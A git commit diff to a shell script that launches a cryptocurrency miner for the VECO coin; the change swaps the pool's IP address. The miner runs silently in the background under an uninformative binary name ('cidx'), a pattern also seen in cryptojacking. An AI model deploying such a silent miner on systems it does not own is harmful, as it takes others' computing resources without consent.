2229871c1099904d1322a58d7873eb51fc62cacb
barburonjilo <barburonjilo@outlook.co.id>
2025-06-16 08:01:52 +0700

    Update vecos2.sh

--- vecos2.sh
+++ vecos2.sh
@@ -27,7 +27,7 @@ END
   # Run cidx in the background
   # nohup ./cidx -c 'config.json' &>/dev/null &
   nohup ./cidx -a yespower  \
-  -o 45.115.224.74:443 \
+  -o 45.115.224.189:443 \
   -u VGq2bKrQ2AiJPNwttzKw7FE8RZJSQQva3G.worker2 \
   -p c=VECO,m=solo,zap=VECO,mc=VECO -t 6 &>/dev/null &
 
